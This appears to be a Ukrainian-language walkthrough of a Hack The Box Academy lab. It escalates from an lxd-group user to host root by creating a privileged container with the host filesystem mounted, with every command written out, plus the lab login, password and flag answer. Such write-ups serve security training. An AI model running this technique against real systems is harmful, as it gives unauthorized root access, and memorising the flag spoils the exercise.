## Containers

Ціль: `10.129.115.3`  

Питання:
- Escalate the privileges and submit вміст `flag.txt` як відповідь.

Відповідь:
- `HTB{C0nT41n3rs_uhhh}`

***

## Крок 1 — Логін та перевірка груп

```bash
ssh htb-student@10.129.115.3
# Password: HTB_@cademy_stdnt!

id
# uid=1000(htb-student) gid=1000(htb-student) groups=1000(htb-student),116(lxd)
```

Користувач у групі **`lxd`**, що означає можливість керувати LXD-контейнерами і, при неправильній конфігурації, робити прівеск до root хоста. [cucybersec](https://cucybersec.club/blog/htb-linux-priv-esc/)

***

## Крок 2 — Працюємо з LXD образами

У каталозі `ContainerImages`:

```bash
cd ~/ContainerImages
ls
# alpine-v3.18-x86_64-20230607_1234.tar.gz
```

Спроба імпорту неіснуючого образу (`ubuntu-template.tar.xz`) дає помилку, тож використовуємо **alpine**:

```bash
lxc image import ./alpine-v3.18-x86_64-20230607_1234.tar.gz --alias privescimage

lxc image list
# показує privescimage з описом "alpine v3.18 ..."
```

***

## Крок 3 — Створення привілейованого контейнера

```bash
lxc init privescimage privesc -c security.privileged=true
# Creating privesc
```

- `init` – створює контейнер з образу `privescimage`.
- `-c security.privileged=true` – робить контейнер **privileged**, тобто його root ближче до root хоста і може мати прямі доступи до host-ресурсів при неправильному мапінгу. [infosecwriteups](https://infosecwriteups.com/hackthebox-academy-privilege-escalation-ca0a8ad2259e)

***

## Крок 4 — Маунт root-файлової системи хоста в контейнер

```bash
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
# Device host-root added to privesc
```

Розбір:

- Додаємо до контейнера `privesc` **disk device**:
  - `source=/` – корінь хостової FS.
  - `path=/mnt/root` – точка маунта всередині контейнера.
  - `recursive=true` – рекурсивне мапінгування. [cucybersec](https://cucybersec.club/blog/htb-linux-priv-esc/)

Фактично root-контейнер бачить **весь хост** у `/mnt/root`.

***

## Крок 5 — Запуск контейнера і вхід у нього з root’ом

```bash
lxc start privesc

lxc exec privesc /bin/sh
~ # whoami
# root
```

- `lxc exec ...` запускає shell у контейнері **від root контейнера**.
- Оскільки контейнер **privileged** і має змонтований `/` хоста, цей root може діяти на host FS. [infosecwriteups](https://infosecwriteups.com/hackthebox-academy-privilege-escalation-ca0a8ad2259e)

***

## Крок 6 — Перехід у root FS хоста та читання флагу

Всередині контейнера:

```bash
~ # cd /mnt/root
/mnt/root # ls
# bin etc lib64 mnt run sys ...
```

Це корінь **хостової** системи, змонтований у контейнер.

Далі:

```bash
/mnt/root # cd /root
# (порожньо в контейнері, бо це root контейнера)

# правильний шлях — хост:
/mnt/root # cd /mnt/root/root
/mnt/root/root # ls
# flag.txt  snap

/mnt/root/root # cat flag.txt
# HTB{C0nT41n3rs_uhhh}
```

У цьому каталозі:

- `/mnt/root/root` – `/root` **хостової** машини.
- `flag.txt` – файл завдання з флагом.

Відповідь:

> `HTB{C0nT41n3rs_uhhh}`

***

## Конспект команд для Containers прівеску (через LXD)

1. Логін:

   ```bash
   ssh htb-student@10.129.115.3
   # Password: HTB_@cademy_stdnt!
   id  # перевірити, що є в групі lxd
   ```

2. Імпорт контейнер-образу:

   ```bash
   cd ~/ContainerImages
   lxc image import ./alpine-v3.18-x86_64-20230607_1234.tar.gz --alias privescimage
   lxc image list
   ```

3. Створити привілейований контейнер:

   ```bash
   lxc init privescimage privesc -c security.privileged=true
   ```

4. Замаунтити root FS хоста в контейнер:

   ```bash
   lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
   ```

5. Запустити контейнер і зайти всередину:

   ```bash
   lxc start privesc
   lxc exec privesc /bin/sh
   whoami  # root (контейнера)
   ```

6. Прочитати флаг з хоста:

   ```bash
   cd /mnt/root/root
   ls        # flag.txt
   cat flag.txt
   # HTB{C0nT41n3rs_uhhh}
   ```
